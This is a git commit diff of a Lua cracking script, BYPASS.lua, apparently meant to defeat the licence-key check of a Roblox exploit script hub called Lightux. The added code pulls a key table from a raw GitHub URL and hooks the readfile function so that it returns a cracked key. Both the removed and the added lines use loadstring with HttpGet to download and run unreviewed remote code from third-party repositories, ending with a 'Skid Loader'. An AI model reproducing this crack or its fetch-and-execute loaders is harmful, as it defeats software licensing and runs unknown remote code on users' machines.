a6779bc1d2943b034b4416da5ab3a22919e998f3
C1H4N <108697650+TheHanki@users.noreply.github.com>
2023-06-20 23:44:24 +0300

    Update BYPASS.lua

--- Lightux/V1.5/BYPASS.lua
+++ Lightux/V1.5/BYPASS.lua
@@ -1,35 +1,33 @@
+local OnMobile = game:GetService("UserInputService").TouchEnabled
+local OnLaptop = game:GetService("UserInputService").KeyboardEnabled
+local Keys = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/Cracks/main/Lightux/V1.5/LightuxKeys.lua"))()
+bypasskey = ""
+
+-- quick bypass
+
+function key(keyy)
+	for i, v in pairs(Keys) do
+		if keyy == i then
+			return v
+		end
+	end
+end
+
+if OnMobile then
+	--Dont try this unless youre on mobile
+	bypasskey = key("Mobile")
+elseif OnLaptop then	
+	--Dont try this unless youre on pc
+	bypasskey = key("Pc")
+end
+
 local originalReadFile = readfile
 readfile = function(path)
-   print("BYPASSED!")
-   return "QHvMlkGYu0fExAA"
+	print("Bypassed by Hanki and Alex!")
+	return bypasskey
 end
 
-
-if game.PlaceId == 662417684 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/vcxngf45eg/main/README.md"))()
-
-    elseif game.PlaceId == 621129760 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/KATPC/main/README.md"))()
-
-    elseif game.PlaceId == 1240123653 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/fsfv832vwaww/main/README.md"))()
-
-    elseif game.PlaceId == 1632210982 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/fsfv832vwaww/main/README.md"))()
-
-    elseif game.PlaceId == 9759729519 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/fsdsfdewesdfdfsd/main/README.md"))()
-
-    elseif game.PlaceId == 10950541730 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/fsdsfdewesdfdfsd/main/README.md"))()
-
-    elseif game.PlaceId == 10950394697 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/fsdsfdewesdfdfsd/main/README.md"))()
-
-    elseif game.PlaceId == 1962086868 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/Toh/main/README.md"))()
-
-    elseif game.PlaceId == 11063612131 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/-Every-Second-You-Get-1-Jump-Power/main/README.md"))()
-
-end
+-- BROOO THEIR LIGHTNING BACKGROUND SUCKS. IT FILLS FULL SCREEN
+-- Lightux game detection sucks my ass
+-- Skid Loader
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
